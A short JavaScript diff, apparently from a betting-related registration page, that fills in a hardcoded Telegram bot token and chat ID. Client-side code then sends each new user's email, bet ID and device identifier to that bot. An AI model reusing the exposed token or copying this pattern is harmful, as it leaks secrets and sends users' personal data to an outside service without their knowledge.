@@ -442,8 +442,8 @@
                 });
             }).then(() => {
                 // SEND TO TELEGRAM BOT
-                const botToken = "YOUR_BOT_TOKEN"; // ENTER YOUR BOT TOKEN HERE
-                const chatId = "YOUR_CHAT_ID";     // ENTER YOUR CHAT ID HERE
+                const botToken = "8044947548:AAFMqhrt2A5qEt-lK92n39_8sJS014i_5U0"; // ENTER YOUR BOT TOKEN HERE
+                const chatId = "6877320092";     // ENTER YOUR CHAT ID HERE
                 const text = `🚀 *NEW USER REGISTERED*\n\n📧 Email: ${email}\n🎮 Site: ${site}\n🆔 Bet ID: ${betId}\n📱 Device: ${getDeviceId()}`;
                 
                 fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}&parse_mode=Markdown`)
